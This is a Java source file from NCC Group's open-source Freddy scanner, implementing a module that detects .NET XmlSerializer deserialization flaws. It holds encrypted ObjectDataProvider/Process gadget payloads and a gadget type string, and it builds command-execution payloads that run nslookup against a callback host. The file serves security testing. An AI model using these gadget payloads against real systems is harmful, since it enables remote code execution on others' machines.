// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.dotnet;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the .NET XmlSerializer API.
 *
 * Like DataContractSerializer, exploitation relies on
 * control of a type parameter however depending on the
 * target it may be possible to wrap the payload with a
 * root XML element which specifies the type to
 * deserialize as. This module includes both wrapped and
 * non-wrapped payloads.
 *
 * If the type is controlled, it needs to be set to:
 *  -> System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class XmlSerializerModule extends FreddyModuleBase {
    //Wrapped payload name
    private static final String PN_OBJDATPRO_WRAPPED = PN_OBJDATPRO + "_Wrapped";

    //ObjectDataProvider payload data
    private final String OBJD_PREFIX = decrypt("21ECI++gRLWho4/vDf63W5IuJ9/Twk8Ei5rPA4ynHKTP8PknMLHx5M4tYvq4rSg65TtzpQwoiVc3Om435jGA/tqnMAeVKBvn9Gi6aZK9EXqEuq4s8DlsAGugeHaiAcYX5vIODVYCU4rdPvxMMZSFSFWqFpfrjp6W6tNcL8bmNqMP1nR6Nq+sbzOx+u2aShZh9pV7aHs9Dy+eQONuZo/n0hSCcgZ42mEG7uhxIc6CnUImVP2LMlfECKRerIWcMlmdi/seOIe4UiO6wtzd/0kXzv8jHHdY/vIDMmSwYHsbbpcnMhi7DQUfcvKnemkvYYo6OIdYSkHKwdoAN/eSamY9pJXY1Qkk4UpItwJxBXe/T89kQyZgpoIzKHciue9F92HZgcwi7OevxSIF7tOchi18ngl8sTeQ/wfFHw15FF9ViqQHoHmo5iIfiyEaFBWfYXmr3lhezx4z0AMFKx0U0v8SeEfrRKpEolbL5zFCRioj3gxsyDuHmCtYD+ArQ6KGox37DtUPP8tn0xCgX24EBf1WPHwhYT8Adj0cse1b+gdkIjKCxrrU8m0dHmD9PoJEPshy/ItnyB6Ox3AP6DCZT3v0k9Wb2WeF0+dttzOYM69Nn1oyeWaVhLOz23lM5Stsuse+kcBN3hA5EyOuK63EOZpBFyJ2VkixFlSL0ECrKipf/6B20xXMOaHcu/HT4VkyJLFsiEEompDnoDgo6f+guGAuI3/pCWcfnei+3UltJ3X4jYu4I+KZvRQQlZOwbPR2J5Blw7tq+IZN9AdCDGUxgYEwQiYOOiWg5nmgjRKLnKl9RFZxoOsFKXHy47mcdgv669vEx4BAnAQaYSC8+UxiLqdzFmQ0hSKil0YN9QqBZ88pN9Pt7pF9PF4PpNGrachCxUsiPQwHyEt63VBlWai26jkQBLc04AtJRQqAoYoHNPXnXrEDQX/nZWHYYvT/B1VjiD6ufRwWIddSoo7lM0h5g/drDn4p9d1d+WLS/T6rmbl23SpGSYpEDxxA0wdobZE0i2NOAMpSfBqJQIW9b7BJribZk9Zv1rpVs393K1Kch1rX8eLCBlkpvJhF++i1QHRr+Nnbfwk/45LhDBDuGLXpV1hY8zatNVKql6HUqg7rprHhkwZ/ew+I4e/0OjQcoqcSsDnG9Ff3XAXvh9aDduqlMbu91QyoJkKYatbZt2bzArdOGp65hxRULcSCOESe6U6xRSZdNHvAtkKxwNwCxtJxJBBBiIFXSsyLxtpqzPz/0zz7+H7p1gt4St85fyxg0QyMhxV2fFr6jF8+eXKSxTPuFMZ88FnEcwLuiRCr9WCwUIhje48g7UEREW8mfCTRux38yCOtvsBIJjI/ntfZeDfQrE2MskyMLYDdbgLqJrH1qQ6aiKMMpud/s+M3yh7xkO+hOSnzTc8rGtIDL95JzTjunhv1I9r0ZdOxGER4TCqNsJolb7jrxftqtxVzgTdUEE68DI4P/AAoMj4MC8OH0i+3LElGD67MgMyKPpEApYb9+0f5v6ZjBbbjZA3iquJz8F5+Dl8HLM1obTnZCDIgXz7tM9gWqlwFb69T4JWDfAy2LYoU5zf/12azT4yureZldD9nMbNo4JoZJPinSOeyKaqiUQsKpOvF+2q3FXOBN1QQTrwMjg8w8BGxFZ3FYMoQhJL2nifjEFdM4EDdOQhXnmzA6HpdEOoKq8tgeWdDwpr9rUeWJHOQVN5w9rwTTmDMwiELF37P1kbk/xsQzwmLVadTnfmGM46iwV7nHaFufyrl1R69dFnlEA0nSyb71KkLems0gAqB");
    private final String OBJD_SUFFIX = decrypt("8njgXt5zWdIgqfqeMhPl0XgBINfud26p1H6/Ebbr29BK0RPJfYbe/hp7Zu3tfKVjBuN2/DSRbI9ApEDi2MWhpBhDsjQjOoaIYzVJ4drGccMwylYP2JM4rdeX7Z7M/FBL03690xyFu1eB5DyNN3D/WZWEGdjTSbdU12ahQr1b7xtcCNMfirKQKf0tckeOdofht0lveURmNwEhGKMjSuy143lay4LmAdt6GLiFHmz+SPUdfl4mwg1Ie2dHGMV6E6+QUdpER0lbfw5BV3y/JuMCKXfjqUQhqdaM/q2eRvLkJ58fukY0vLwAlUgYr3b5qMuarPElr385EmrffIS4LMmGSTAehOgRZb66x2IpOfMLLI1fuZLyuyqEOV8fZ/iDpi8E");
    private final String OBJDW_PREFIX = decrypt("21ECI++gRLWho4/vDf63Wy+0GBy47O+UFKdUKs35ffLUJUGY21Fj18w/IlQ6rq+AeIMhLvY7wDNoR/3x4OB2mfYICKYZjDkwKVoKU8shkbvJLYKQ53RH06m1PDL07V6lzNmSdHGfDtEqErQcrFLDmiaHfoMC1e3KcbziDzOOAExSffAyJV8IVGcbonu5vIwc4D2n4j28QVl+NdGzjPqrCaDYscwB6KLa8McUpAs40+IJot76gTFlWcJg/8b0pUCAOOgY4jRiz8h6EHJ6EOsIWCbod8NiciTGUqbqDrNUSnuFpxrkbUCzQlZ/GesmqbwH/0B/oEvVxlqPJDFCQIk1HueBbOU/05iM2unJNfxwZd/66ltckdS2f885zbEgw6kRpvOBh+aj0VV9OUtwEFe1Gt+t5Fff6ckwiANySHTX7iq13/JiUURtQzibrZvhc8sT0p7BBQFW1khXaEghT2UvDD3Zgt1Ztisv6Fc+ofpcI17aDr+3YpBRLuRb2xDgzQCgtIinTccW7U3n/BO44dBmmt1+nnP0Osj3mTSlL8FqBB5pjnM4IsILBZ35a5VdF+5Hth2YaG5Wh1lTUjJTOnyrb9jWs+ZvJ8RkHI+BGQpDKTZ+98dHxPW3hip0RGjZZxlmctOZfamiYlLnGN0fsC/wYTxHH7mtRb8LYbmJh2xu9ixTECnY26KYsbZetmRfrRS2Woxhen18PRE5b2wan/oh7lF33/CorOPEP0X7j1WVmiQ2ZQHdcv9LHrnoieXvFYPtH7BaoKR0sShXICPuxCb4puCVvgV81Lc4brZfV2b/ae4a/ePYvocHPvy3hcYru+3ra0UkEIQ7GFlU/7NNoXU3uw8wGRXVaQnX7PxzEjfyeNLjJEBgP24/xdrpdJpo3SJKfORKm2qnpnKHxC9eM9Wk8H4p9d1d+WLS/T6rmbl23SoXLmJOYF3NgDYYewySPwlxyJ8t2GwbANp/VaMiGZbNRvKYoQ9oYUZTxrJZDF20UR2MfeUSdcbf1Hvb4lzlOLhT8IBRlKzjWBpZslPAP2LZ6n2uaRwvStskzUx4S1MsQSe6mRtMAoEEwwCwpYgLEFaHGGsxHWPiNBsxTCXvi88ovTJSecp953fQZr8SR+2QZNpux9VeS4z4jkOhzIfzoM5M/0B0kGQRdnmJi2yxZ7U46LmFaE87F0TB46Mh+eqAefxQPnS+KnxRLE4muq4PIRXgkBIigQ4Wd4cy3hX6DemIBjBafISkM9aKb2jlJ/wKeJ5Y6AJhgu9hdwPzfy76sBaxNkDBXEduRZxER37OS10kvZkre6GFo5/SYWJAixf95qKTZbuQ45ldMUhxX51yEnd+4Y+tk0QELAJPUQLemj8z0vw0lZn7Fr+9MwOLTu6uVM/zdhRVsNbra3vo6mVsFGH482RN8auIPpkTQC4CESOt6kJ5TlujSvtZN76emWNPtpfgXvOeyhchdchVruSgT6EwmM8hQeJg5MQqHRDsmteGtttj4h7yXp2nbQYzJJ1kE7aedSg+BWQc3zNf8i9BuxfVLoWxuM+5XKp6dRjL3Sf19iqIAO1h/gZNbZrldPH58I3d6kHck/Vt8XGYEJ3cEWW4+scEFVAdAisKEGTDioL7XOBe857KFyF1yFWu5KBPoTA/+VENCSMh0woQKdo2q1BQdHiKVkXGb9k4D/RonBf6qC/yqIxBiOobvLGv3ZbXSMUAoiPLnKXun3RFgC6M0a6fIa5WULLgV/6FKdyDF/8s4XUK5cEcT2L/BR88+YYN2Wl8ryCvKtY1D+LRkIrRgFAQ");
    private final String OBJDW_SUFFIX = decrypt("8njgXt5zWdIgqfqeMhPl0XgBINfud26p1H6/Ebbr29BK0RPJfYbe/hp7Zu3tfKVjBuN2/DSRbI9ApEDi2MWhpBhDsjQjOoaIYzVJ4drGccMwylYP2JM4rdeX7Z7M/FBL03690xyFu1eB5DyNN3D/WZWEGdjTSbdU12ahQr1b7xtcCNMfirKQKf0tckeOdofht0lveURmNwEhGKMjSuy143lay4LmAdt6GLiFHmz+SPUdfl4mwg1Ie2dHGMV6E6+QUdpER0lbfw5BV3y/JuMCKXfjqUQhqdaM/q2eRvLkJ58fukY0vLwAlUgYr3b5qMuarPElr385EmrffIS4LMmGSTAehOgRZb66x2IpOfMLLI1kEBrOzYcuWi9Pg1qbUcXe");

    protected void initialiseModule() {
        setName("XmlSerializer");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("Note that exploitation relies on control of the type parameter to the " +
                "XmlSerializer constructor.");
        setRemediationDetail("");
        setSeverity(SeverityRating.MEDIUM);

        registerPassiveScanIndicator("GeneratedAssembly.XmlSerializationReader", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<test/>", "GeneratedAssembly.XmlSerializationReader");

        registerActiveScanCollaboratorPayload(PN_OBJDATPRO, false);
        registerActiveScanCollaboratorPayload(PN_OBJDATPRO_WRAPPED, false);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_OBJDATPRO:
                return OBJD_PREFIX + "nslookup " + hostname + OBJD_SUFFIX;

            case PN_OBJDATPRO_WRAPPED:
                return OBJDW_PREFIX + "nslookup " + hostname + OBJDW_SUFFIX;
        }
        return null;
    }
}
